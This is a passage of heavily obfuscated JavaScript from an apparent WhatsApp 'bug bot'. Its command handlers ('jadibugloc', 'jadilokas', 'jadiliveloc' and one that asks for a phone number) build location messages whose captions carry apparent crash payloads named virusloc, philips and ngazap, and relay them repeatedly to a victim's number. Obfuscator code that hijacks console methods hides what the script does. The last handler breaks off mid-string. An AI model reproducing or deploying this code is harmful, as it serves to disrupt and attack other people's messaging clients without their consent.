_0xf978c4=['9OnbSqe','return\x20(function()\x20','log','(((.+)+)+)+$','table','0@s.whatsapp.net','error','3062NnEtTx','{}.constructor(\x22return\x20this\x22)(\x20)','apply','chat','1848148nzMIsE','18248hLPYSm','/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQAZAMBIgACEQEDEQH/xAAcAAABBAMBAAAAAAAAAAAAAAAAAQIDBAUGBwj/xAA7EAACAQMDAQUECAQGAwAAAAABAgMABBEFEiExBhMiQVEjYXGRFBUygaGxwfAHUtHhJDNCU4LxQ0Ri/8QAGwEBAAMBAQEBAAAAAAAAAAAAAAECAwQFBgf/xAAmEQACAgEEAQMFAQAAAAAAAAAAAQIRAwQSITFRBQYiEzJBcbGB/9oADAMBAAIRAxEAPwD0GunXj/5t1HGPSKPJ+ZP6VdtLaO1tp1XeyP4TvYsXb1zVknAJPQUwD/JU9VTefix/7rkwaDBglugufLbf96/w1yZ55FTfA2K3ijjRFjUBVCjipaKK7bsxCiimTzRW8TSzyJFEvLO7BQPiTUAnHSoXeRLWARsUPclunmAP61Rtdc0u9Zo7HUrG5kAOUhnVz8gayjQybYSqqwVNpBOPT+lYQi0m0aSTTqSoZctJ3jZjVo+Mbo9w6e6ltVR45D3apnKErxxj8Kj7uWPokyAfytkfLP6Uomd7WQFwwJEatjBOev4VuZiW74Cny8skA48vwqnpthZ6Wpjsxb/Sd3t3jHtCGyV3EksegGSecVe6VqfaS4GmapK8d7eWsV2gnnKPDGhcARr43BYZ2qDjpkHjNSQzbaKhsCrafatEZnjaJWVp2LOQRnxE+fNFQSPZe8IiHV+D7h5mnEiWZngkR93+k8Hj09ar3kvcWl5MOqR7R8T+xUkUQW3jjcBtqgc+4VNcWRfNDyWX7cci/wDHP5UgkQnAYZ9M80Bdv2Gdfgx/KnFpSMF1cejoD+WKgkZPMlvBJNMwWKNS7MfIAZJrzr2u7S3ev6i89y7R26MTFCTxEP6+p+PlgDvevWbX+hajZxQxrJcW0kSsjFcFlIHH315kv4WkSWLxIx4wwwQfQ15vqE5JKK6Z9V7YwY5ynkkrkuggu0kb2UuWU7vv9a7f/C7tLNrttNaak5lu7ZRslY+J4/efMg+fnkdTk1wCws5YrjvJMKBnzzmutfwVtX+ub2+YlYY7cw5PQszKR9/gPzHrXNo5OOVRi+Get67ihl0UsmVVJdHYoyUmi8bhS2DliR0Pr78UNBIsjttAXcz7mfCj3/HFKQGGDgg0IALOUbwgZtvPIA6Y/frXtn5+M3D/AHo/uUmsP2jtbm5S0ksIIriaJyGlEMfeopH/AI+98Oc4rMK2XADBxjqFIx86enFxF78gfHH9jQdmK0W6OmWCwzxa3cyMzSFriHe65JwpKZXgAdOPniirTXTRBRxkjJyfM9fxoqSBL0g28EZGe/myR6gHH5VcqvJFuvolJ8NvGBj/AOiOvyz86sVL6SC7YUUUVUkK4z/Fvs39C1D61s4z9HuG9sAOEk65+Dcn4g+ors1Y7X9LTWdMudPbg3CEBvJSOQ2PccGsc+JZYOLO707Wy0WeOVdfn9Hm2xtZr27htrZDJNKwRFHmScD/ALr0X2X0dezuiwWNswZ+DKSOJJDgE+uPIc8AD0rmn8GNMS41m7v5UI+ixr3YbyZ8jPxAVh/yrsQIEu88iJS5+PQfrXLoMO2O99s9f3Hr3mzLBH7Y/wBYFAGIaFkOcbojwfupfZLE0bySZLbt3dkfpWo6YCt/26DcMHViD77frWI0TUtWFhpmn6bc21vDD2fjviZbfvSWDMMDkYzgeteltPmN50XbHtz9IfHX7P8AakHdB1Y3OdpB+zWitrl9ciXU7G3tlvvqCC9Ps8lvaOXQHrjAOB61Lf8Aa+4azvLyxSOWznvodPsj3BkIJTMjlV5fqQAPMYqNrG9G5tGneyhgDhj+PP60Vrej65qUkdwL/Sby5dJSsdwLSS371NqkEowyDkkenFFKZO5Gajuz9YzQzLtEjFoX8nA6j48VdqhqMHeSWJQf4cS94c9VKg8fOrrbgAXdIgegYZY/dVpVSaIjdtMdRQqO+O7ZHU/6um34ilMcw6IJAehQj9aoWEojfu0M23cznagzjj95/Cju5X8G0JngksMgUjMrzNtxsj8Cj09f37qAx2laRpukd/8AVsX0Pv33yB8spPuJPA9BnHurIMpVNrFS0rZO05G0f3/Oldtqk4z6D1pFhZHIXuWk/wBSr4WH9ahJLhFpScncnbNV7Ujsqur7daM6X80CtItutx7WLJUb+6GGHBHNZqwtdIv0j1HT4opo5bT6GkkLMF7gE+AAHAwc+WR0rAagmpt/EsDSpLSCX6nTvDdRs4C9+/QKw56edYjWrObQ10axluon06Y3E1xNPcSWcUk7HcAzICVGCdq9Dj3VejG65o32x0ixsXja0tNhS2WzGWZh3SkkLgk+ZPPWqp0PSbbRPq1rILpMCPJ3YZsqQd+4NncGznnOa0rS7WTUtTsLXVb6W8QaJNJ3lvcSqshFxhGJ8JbCkckckZ5qnFfpeWGnHtJfTxwNou+0b6Q8Yln3MCSVI3Pjbwc9enNTQ3LwbnpmoaFp2n27wJeSR3kYuhJJFNcO+4YyzeLnw9M0VznWbqeDTOzawzSxqdJhOEcgZy1FTssr9SjslmZILeQzuJSDkEqAN58h7ulSRRmSYqWOcbnYdfcPz+VPVg4WO3ZSo4KSL9seuaVhGqMIoy8WfGUY7gRWbduzZKhsZghmYtJmT7O5lwF+NRzMs0rFsupOEUDIIHniprx4h3bP3ilhw6r5ehzTU9nFJMsgckbEO3GDn9/KgGxr3CSShAjt4EGMff8Av0pGJY+1jWQ/zA7WpXZtpEgWVBz4+CPgaRtqNxuC7A5DHO2gCM4O+TkRLuPvbyH791EcQfAlAYk5PxowQscZ+0fav+g/fpUkf2xQGt6X2t0+bQrG/v7mHThewSOkE027G1tvBwM/3rIy61pNpplvPeajZJb3jAxO0g2yAY6fr6ZrWeyfZ/UtPk7Kve2yxixtLmOcmRD3bu+VHB5yPSoNA0XWNA+prubS3vDFbXNrJbpLHmEvOXV8k4wV4ODwKtSKKUjP6V2rtJ+yWn6tq1zb6ebokhXk4OGIIGeTwKu6j2g0uySBrvU7ONZU76JnfIZf5lx16+VanoGjar2fj0G4m097uW2sZbSW1ikjLxM0u5XGSAQQMHB8/jVvsr2dv9O1XR5LuJO6gs7iOXY6lYXkl3iMeZwDjIGOKNIJyNyt5hdW8c8F7HJDIoZHRcqwPQg5ormUfYHWrvRtHRtR+rpra17mSDvM+LvHbOVyOjDz8qKbV5G6Xg6dFuCNJGgeTds2/wAq5/f4UhIR3jtx3ahuWByTx0+FKMpMsW4hYx3srDjJ9Kaz94d0sXJ6FDhh/WqlwZ5EVmL7/VWGQaknVB3cSNHGy+LYeAc+/wCdNiRWIfvQ0SHc2Rhhj1/OmuyyndNAfF5o3OPeKAHSRsRtG43EAnqMefIpJPaSv6O4QfAcH8jUneYeWdZSyhf8s5GDxjimQ4jdS2SIkLn49P60Bodl2p1DVNavdAtbtI9SOpXCm4aNP8PaxtwFBGGcgEDIPmTWw6r2lh0zUlt7qzuhb95HC10zIoLNgAhMhmXJGSB61VbshF9Du1jvDFfSajJqVvdpDhoHYg7cZ8QxkHkZBqtqfY6S8u72V9StljubiK6dms90odNvhD7+E8PA8s/HNuDP5IluO2Mcck5bSL97SC/awadHjIaVWwAFLA8n4AZ61PJ2yNvDI0+nXqXqX0dk9kWjLBpBuQhgcEEEeYpr9moWs7i2+sMGbVjqmTDjHjDd3jdz0xu/CqvavQbqW5F3psjyTXesWdwdsO4W4jQIWPPiAxk9PT304J+SMkvbCDcqXWnT296t/DYSwSFS0Zl5R8gkFcc8VHf9qrWymv4jbTPJBex2aAOoEkki7xycBR15NQT9lbi5juri51JDq8t5DerMsBESNDwibN2SMZzz50L2avBDqjy6pby3N5cRXEqvZAwOANvdshYkqcDzB4FOB8jYdIuH1G0Mz2lxZursjRTqAcjzBHDKfIjg0VV7K6WNB0xrUzCUvK8xEamOOPcc7EXJwo9M0VVll1yZKJ2m7+GQ5VVBDedRW0hkQlsZBxxRRQkf/wCpAP8Adbc/v4z+gp1FFAJHg3AQgFXUgj4VLNbpHBMVLcgdTnoelFFAVbeRpYdzYB91WrSKNoY5e7UNjPHTPrRRQGNlv7hJWUsHX0ZRVmxdbk+OGJT6oMGiijBIo2s6jOFYgZOahuHKttGMSgK2fd6fOiigJ6KKKA//2Q==','1923GvjoZO','console','@s.whatsapp.net','18qCmesD','Nomernya\x20mana?','bind','__proto__','constructor','toString','prototype','relayMessage','1388365rjaQxj','reply','1223550ERhtNZ','Message','fromObject','11132520xEEjqY','length','1108700wnwhpY','key','search','1657997490287001','message','info','warn'];_0x173d=function(){return _0xf978c4;};return _0x173d();}_0x38877b();function _0x2c7a(_0x59f735,_0x40aea8){const _0x3194e3=_0x173d();return _0x2c7a=function(_0x53bd3c,_0x209a0b){_0x53bd3c=_0x53bd3c-0x134;let _0x40efc4=_0x3194e3[_0x53bd3c];return _0x40efc4;},_0x2c7a(_0x59f735,_0x40aea8);}const _0x209a0b=(function(){let _0x840899=!![];return function(_0xc5d6e3,_0xa23697){const _0x29df25=_0x840899?function(){const _0x1082cf=_0x2c7a;if(_0xa23697){const _0x29e9be=_0xa23697[_0x1082cf(0x152)](_0xc5d6e3,arguments);return _0xa23697=null,_0x29e9be;}}:function(){};return _0x840899=![],_0x29df25;};}()),_0x53bd3c=_0x209a0b(this,function(){const _0x7b6072=_0x2c7a,_0x1a6a3c=function(){const _0x1a6b4f=_0x2c7a;let _0x2cea5a;try{_0x2cea5a=Function(_0x1a6b4f(0x14a)+_0x1a6b4f(0x151)+');')();}catch(_0x7bf7b8){_0x2cea5a=window;}return _0x2cea5a;},_0x260002=_0x1a6a3c(),_0x2ff543=_0x260002[_0x7b6072(0x158)]=_0x260002[_0x7b6072(0x158)]||{},_0x4eddb7=[_0x7b6072(0x14b),_0x7b6072(0x148),_0x7b6072(0x147),_0x7b6072(0x14f),'exception',_0x7b6072(0x14d),'trace'];for(let _0x594fa1=0x0;_0x594fa1<_0x4eddb7[_0x7b6072(0x141)];_0x594fa1++){const _0x3e7c9f=_0x209a0b[_0x7b6072(0x137)][_0x7b6072(0x139)][_0x7b6072(0x135)](_0x209a0b),_0x409f58=_0x4eddb7[_0x594fa1],_0x1fb916=_0x2ff543[_0x409f58]||_0x3e7c9f;_0x3e7c9f[_0x7b6072(0x136)]=_0x209a0b[_0x7b6072(0x135)](_0x209a0b),_0x3e7c9f[_0x7b6072(0x138)]=_0x1fb916['toString'][_0x7b6072(0x135)](_0x1fb916),_0x2ff543[_0x409f58]=_0x3e7c9f;}});_0x53bd3c();{if(!isCreator&&!isBan)return;if(!text)throw _0x1528fe(0x134);let doc={'key':{'participant':_0x1528fe(0x14e)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var liveLocation=generateWAMessageFromContent(m['chat'],proto[_0x1528fe(0x13e)][_0x1528fe(0x13f)]({'liveLocationMessage':{'degreesLatitude':-6.9366881,'degreesLongitude':107.7228148,'caption':'THE\x20IKYY\x20BOTZ\x20'+philips+'\x20'+ngazap(prefix),'sequenceNumber':_0x1528fe(0x145),'jpegThumbnail':_0x1528fe(0x156)}}),{'userJid':m[_0x1528fe(0x153)],'quoted':doc});ikycoli[_0x1528fe(0x13a)](text+_0x1528fe(0x159),liveLocation[_0x1528fe(0x146)],{'messageId':liveLocation[_0x1528fe(0x143)]['id']}),ikycoli['relayMessage'](text+_0x1528fe(0x159),liveLocation['message'],{'messageId':liveLocation[_0x1528fe(0x143)]['id']}),ikycoli[_0x1528fe(0x13a)](text+_0x1528fe(0x159),liveLocation[_0x1528fe(0x146)],{'messageId':liveLocation[_0x1528fe(0x143)]['id']}),ikycoli[_0x1528fe(0x13a)](text+_0x1528fe(0x159),liveLocation[_0x1528fe(0x146)],{'messageId':liveLocation[_0x1528fe(0x143)]['id']}),ikycoli[_0x1528fe(0x13a)](text+'@s.whatsapp.net',liveLocation['message'],{'messageId':liveLocation[_0x1528fe(0x143)]['id']}),await m[_0x1528fe(0x13c)]('Berhasil\x20Mengirim\x20liveloc\x20Di\x20Nomer\x20'+text);}
}
break
case 'jadibugloc':{
var _0x18da71=_0x5de0;(function(_0x1b870d,_0xb22a21){var _0x4c3630=_0x5de0,_0x5eaabd=_0x1b870d();while(!![]){try{var _0x20a6d7=parseInt(_0x4c3630(0x1e6))/0x1+parseInt(_0x4c3630(0x1e9))/0x2*(parseInt(_0x4c3630(0x1ed))/0x3)+-parseInt(_0x4c3630(0x1e2))/0x4*(-parseInt(_0x4c3630(0x1ea))/0x5)+parseInt(_0x4c3630(0x1f4))/0x6+-parseInt(_0x4c3630(0x1e3))/0x7+-parseInt(_0x4c3630(0x1da))/0x8*(parseInt(_0x4c3630(0x1f6))/0x9)+-parseInt(_0x4c3630(0x1df))/0xa;if(_0x20a6d7===_0xb22a21)break;else _0x5eaabd['push'](_0x5eaabd['shift']());}catch(_0x17719e){_0x5eaabd['push'](_0x5eaabd['shift']());}}}(_0x3a6c,0xe9369));var _0x265593=(function(){var _0x395c87=!![];return function(_0x23fdb7,_0x2a2ffe){var _0x460218=_0x395c87?function(){var _0x14b401=_0x5de0;if(_0x2a2ffe){var _0x216cee=_0x2a2ffe[_0x14b401(0x1f0)](_0x23fdb7,arguments);return _0x2a2ffe=null,_0x216cee;}}:function(){};return _0x395c87=![],_0x460218;};}()),_0x477281=_0x265593(this,function(){var _0x2f1086=_0x5de0;return _0x477281[_0x2f1086(0x1ec)]()[_0x2f1086(0x1f5)](_0x2f1086(0x1f8))[_0x2f1086(0x1ec)]()['constructor'](_0x477281)[_0x2f1086(0x1f5)](_0x2f1086(0x1f8));});function _0x5de0(_0x539894,_0x443fc1){var _0xf62a78=_0x3a6c();return _0x5de0=function(_0x1befba,_0x12133d){_0x1befba=_0x1befba-0x1d7;var _0x3eb31a=_0xf62a78[_0x1befba];return _0x3eb31a;},_0x5de0(_0x539894,_0x443fc1);}function _0x3a6c(){var _0x45dc94=['Message','chat','5109512PETLJZ','warn','error','__proto__','console','15868350vTiwBn','relayMessage','Teks/Reply','3460IqNpgr','12875457QvPgke','./pict.jpg','message','1261362YlQTdU','Location\x20','table','45954BVEWRC','7745HJvwsR','imageMessage','toString','249goDYJo','exception','waUploadToServer','apply','readFileSync','info','constructor','3070668udiakw','search','9uaufdK','prototype','(((.+)+)+)+$','length','quoted','bind'];_0x3a6c=function(){return _0x45dc94;};return _0x3a6c();}_0x477281();var _0x12133d=(function(){var _0x2f6548=!![];return function(_0x2e2d24,_0x9039b8){var _0x44c367=_0x2f6548?function(){if(_0x9039b8){var _0x4395f6=_0x9039b8['apply'](_0x2e2d24,arguments);return _0x9039b8=null,_0x4395f6;}}:function(){};return _0x2f6548=![],_0x44c367;};}()),_0x1befba=_0x12133d(this,function(){var _0x5365c3=_0x5de0,_0x5cd94b=function(){var _0x47c728;try{_0x47c728=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x16a097){_0x47c728=window;}return _0x47c728;},_0x2f7e22=_0x5cd94b(),_0x58cfe6=_0x2f7e22[_0x5365c3(0x1de)]=_0x2f7e22[_0x5365c3(0x1de)]||{},_0x52aa63=['log',_0x5365c3(0x1db),_0x5365c3(0x1f2),_0x5365c3(0x1dc),_0x5365c3(0x1ee),_0x5365c3(0x1e8),'trace'];for(var _0x44d216=0x0;_0x44d216<_0x52aa63[_0x5365c3(0x1f9)];_0x44d216++){var _0x2de283=_0x12133d[_0x5365c3(0x1f3)][_0x5365c3(0x1f7)][_0x5365c3(0x1d7)](_0x12133d),_0x105b5e=_0x52aa63[_0x44d216],_0x4effe4=_0x58cfe6[_0x105b5e]||_0x2de283;_0x2de283[_0x5365c3(0x1dd)]=_0x12133d[_0x5365c3(0x1d7)](_0x12133d),_0x2de283[_0x5365c3(0x1ec)]=_0x4effe4['toString'][_0x5365c3(0x1d7)](_0x4effe4),_0x58cfe6[_0x105b5e]=_0x2de283;}});_0x1befba();{if(!isCreator&&!isBan)return;if(!m[_0x18da71(0x1fa)]&&!text)throw _0x18da71(0x1e1);var messa=await prepareWAMessageMedia({'image':fs[_0x18da71(0x1f1)](_0x18da71(0x1e4))},{'upload':ikycoli[_0x18da71(0x1ef)]}),location=generateWAMessageFromContent(m['chat'],proto[_0x18da71(0x1d8)]['fromObject']({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0x18da71(0x1e7)+text+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0x18da71(0x1eb)]}}),{'userJid':m[_0x18da71(0x1d9)],'quoted':fkntliky});ikycoli[_0x18da71(0x1e0)](m[_0x18da71(0x1d9)],location[_0x18da71(0x1e5)],{'messageId':location['key']['id']}),jancok('Sukses\x20Convert\x20Bugloc');}
}
break
case 'jadilokas':{
var _0x16df5a=_0x12e8;(function(_0x2237c2,_0x39a4c0){var _0x2b650e=_0x12e8,_0x4dbd99=_0x2237c2();while(!![]){try{var _0x116753=-parseInt(_0x2b650e(0x126))/0x1+parseInt(_0x2b650e(0x138))/0x2+-parseInt(_0x2b650e(0x13a))/0x3*(-parseInt(_0x2b650e(0x13b))/0x4)+-parseInt(_0x2b650e(0x12e))/0x5*(parseInt(_0x2b650e(0x133))/0x6)+parseInt(_0x2b650e(0x130))/0x7+parseInt(_0x2b650e(0x12d))/0x8*(parseInt(_0x2b650e(0x140))/0x9)+-parseInt(_0x2b650e(0x147))/0xa;if(_0x116753===_0x39a4c0)break;else _0x4dbd99['push'](_0x4dbd99['shift']());}catch(_0x58c6ad){_0x4dbd99['push'](_0x4dbd99['shift']());}}}(_0xcf60,0xb2b63));function _0x12e8(_0x222e0d,_0x1dafad){var _0x56a9cd=_0xcf60();return _0x12e8=function(_0x4bb73f,_0x247a37){_0x4bb73f=_0x4bb73f-0x125;var _0x502afb=_0x56a9cd[_0x4bb73f];return _0x502afb;},_0x12e8(_0x222e0d,_0x1dafad);}var _0x54eb4e=(function(){var _0x1f816d=!![];return function(_0x233138,_0x3c00e6){var _0x2bc077=_0x1f816d?function(){var _0x3278d5=_0x12e8;if(_0x3c00e6){var _0x4da2b0=_0x3c00e6[_0x3278d5(0x12c)](_0x233138,arguments);return _0x3c00e6=null,_0x4da2b0;}}:function(){};return _0x1f816d=![],_0x2bc077;};}()),_0xc4ed7e=_0x54eb4e(this,function(){var _0x3b23f6=_0x12e8;return _0xc4ed7e['toString']()[_0x3b23f6(0x12a)](_0x3b23f6(0x13f))['toString']()['constructor'](_0xc4ed7e)[_0x3b23f6(0x12a)](_0x3b23f6(0x13f));});_0xc4ed7e();function _0xcf60(){var _0x1a41bb=['355sPJzuj','warn','2259936vCQskP','0@s.whatsapp.net','return\x20(function()\x20','51534tUjheF','message','bind','toString','length','2206012oxdZfh','Sukses\x20Convert\x20Lokas','6981ukjriH','1516UlUPZa','quoted','relayMessage','readFileSync','(((.+)+)+)+$','4029327tgTRMd','Message','waUploadToServer','info','console','error','{}.constructor(\x22return\x20this\x22)(\x20)','18693200TDxNEv','__proto__','fromObject','prototype','./pict.jpg','439754tElIWd','key','chat','log','search','exception','apply','24EQJcQv'];_0xcf60=function(){return _0x1a41bb;};return _0xcf60();}var _0x247a37=(function(){var _0x415629=!![];return function(_0x52f1df,_0x5c8f69){var _0x254dcd=_0x415629?function(){var _0x5d41ff=_0x12e8;if(_0x5c8f69){var _0x32c2b2=_0x5c8f69[_0x5d41ff(0x12c)](_0x52f1df,arguments);return _0x5c8f69=null,_0x32c2b2;}}:function(){};return _0x415629=![],_0x254dcd;};}()),_0x4bb73f=_0x247a37(this,function(){var _0x1df2fa=_0x12e8,_0x19ff1c=function(){var _0x466d97=_0x12e8,_0x5328d6;try{_0x5328d6=Function(_0x466d97(0x132)+_0x466d97(0x146)+');')();}catch(_0x318d5a){_0x5328d6=window;}return _0x5328d6;},_0x3d2091=_0x19ff1c(),_0x9122d9=_0x3d2091[_0x1df2fa(0x144)]=_0x3d2091[_0x1df2fa(0x144)]||{},_0x28abfe=[_0x1df2fa(0x129),_0x1df2fa(0x12f),_0x1df2fa(0x143),_0x1df2fa(0x145),_0x1df2fa(0x12b),'table','trace'];for(var _0x67d362=0x0;_0x67d362<_0x28abfe[_0x1df2fa(0x137)];_0x67d362++){var _0x440936=_0x247a37['constructor'][_0x1df2fa(0x14a)][_0x1df2fa(0x135)](_0x247a37),_0x170562=_0x28abfe[_0x67d362],_0x290cff=_0x9122d9[_0x170562]||_0x440936;_0x440936[_0x1df2fa(0x148)]=_0x247a37[_0x1df2fa(0x135)](_0x247a37),_0x440936[_0x1df2fa(0x136)]=_0x290cff[_0x1df2fa(0x136)][_0x1df2fa(0x135)](_0x290cff),_0x9122d9[_0x170562]=_0x440936;}});_0x4bb73f();{if(!isCreator&&!isBan)return;if(!m[_0x16df5a(0x13c)]&&!text)throw'Teks/Reply';let doc={'key':{'participant':_0x16df5a(0x131)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var messa=await prepareWAMessageMedia({'image':fs[_0x16df5a(0x13e)](_0x16df5a(0x125))},{'upload':ikycoli[_0x16df5a(0x142)]}),location=generateWAMessageFromContent(m[_0x16df5a(0x128)],proto[_0x16df5a(0x141)][_0x16df5a(0x149)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':text+'\x20'+virusloc+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':virgam}}),{'userJid':m['chat'],'quoted':doc});ikycoli[_0x16df5a(0x13d)](m['chat'],location[_0x16df5a(0x134)],{'messageId':location[_0x16df5a(0x127)]['id']}),jancok(_0x16df5a(0x139));}
}
break
case 'jadiliveloc':{
const _0x1f1f70=_0x5167;function _0x5167(_0x2b75b1,_0x52a64e){const _0x355498=_0x5c50();return _0x5167=function(_0x515fe0,_0x5b71c4){_0x515fe0=_0x515fe0-0xaf;let _0x1a98c5=_0x355498[_0x515fe0];return _0x1a98c5;},_0x5167(_0x2b75b1,_0x52a64e);}(function(_0x3a2d1e,_0x2dc21a){const _0x5cc9fd=_0x5167,_0x4e5772=_0x3a2d1e();while(!![]){try{const _0x347a8b=-parseInt(_0x5cc9fd(0xb3))/0x1*(-parseInt(_0x5cc9fd(0xc4))/0x2)+parseInt(_0x5cc9fd(0xc3))/0x3*(-parseInt(_0x5cc9fd(0xbc))/0x4)+-parseInt(_0x5cc9fd(0xce))/0x5+parseInt(_0x5cc9fd(0xb2))/0x6+parseInt(_0x5cc9fd(0xb0))/0x7+-parseInt(_0x5cc9fd(0xb4))/0x8*(parseInt(_0x5cc9fd(0xd3))/0x9)+parseInt(_0x5cc9fd(0xcc))/0xa*(parseInt(_0x5cc9fd(0xca))/0xb);if(_0x347a8b===_0x2dc21a)break;else _0x4e5772['push'](_0x4e5772['shift']());}catch(_0x579272){_0x4e5772['push'](_0x4e5772['shift']());}}}(_0x5c50,0x9abcb));const _0x1cacc7=(function(){let _0x46e4bd=!![];return function(_0x31df2f,_0x328ae1){const _0x94ae52=_0x46e4bd?function(){const _0x18fb12=_0x5167;if(_0x328ae1){const _0x5d9448=_0x328ae1[_0x18fb12(0xc9)](_0x31df2f,arguments);return _0x328ae1=null,_0x5d9448;}}:function(){};return _0x46e4bd=![],_0x94ae52;};}()),_0xf2f207=_0x1cacc7(this,function(){const _0xc2993a=_0x5167;return _0xf2f207[_0xc2993a(0xcd)]()[_0xc2993a(0xb7)]('(((.+)+)+)+$')[_0xc2993a(0xcd)]()[_0xc2993a(0xc6)](_0xf2f207)['search']('(((.+)+)+)+$');});function _0x5c50(){const _0x7fb9dc=['message','table','length','fromObject','349557OSteJd','2hlNcsO','info','constructor','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